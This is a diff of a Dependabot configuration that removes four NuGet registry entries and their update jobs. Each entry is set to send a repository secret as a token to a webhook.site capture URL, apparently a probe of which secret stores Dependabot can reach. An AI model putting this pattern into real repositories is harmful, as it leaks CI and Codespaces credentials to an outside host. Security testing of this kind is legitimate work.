@@ -1,49 +1,8 @@
 version: 2
-registries:
-  probe-db-repo:
-    type: nuget-feed
-    url: https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/db-repo
-    token: ${{secrets.LOTP_PROBE_DB_REPO}}
-  probe-actions-repo:
-    type: nuget-feed
-    url: https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/actions-repo
-    token: ${{secrets.LOTP_PROBE_ACTIONS_REPO}}
-  probe-actions-env:
-    type: nuget-feed
-    url: https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/actions-env
-    token: ${{secrets.LOTP_PROBE_ACTIONS_ENV}}
-  probe-codespaces-repo:
-    type: nuget-feed
-    url: https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/codespaces-repo
-    token: ${{secrets.LOTP_PROBE_CODESPACES_REPO}}
 updates:
   - package-ecosystem: nuget
     directory: /dependabot/hosted
     schedule:
       interval: daily
       time: "17:00"
-    open-pull-requests-limit: 1
-  - package-ecosystem: nuget
-    directory: /dependabot/secret-probe-db-repo
-    registries: [probe-db-repo]
-    schedule:
-      interval: daily
-    open-pull-requests-limit: 1
-  - package-ecosystem: nuget
-    directory: /dependabot/secret-probe-actions-repo
-    registries: [probe-actions-repo]
-    schedule:
-      interval: daily
-    open-pull-requests-limit: 1
-  - package-ecosystem: nuget
-    directory: /dependabot/secret-probe-actions-env
-    registries: [probe-actions-env]
-    schedule:
-      interval: daily
-    open-pull-requests-limit: 1
-  - package-ecosystem: nuget
-    directory: /dependabot/secret-probe-codespaces-repo
-    registries: [probe-codespaces-repo]
-    schedule:
-      interval: daily
     open-pull-requests-limit: 1
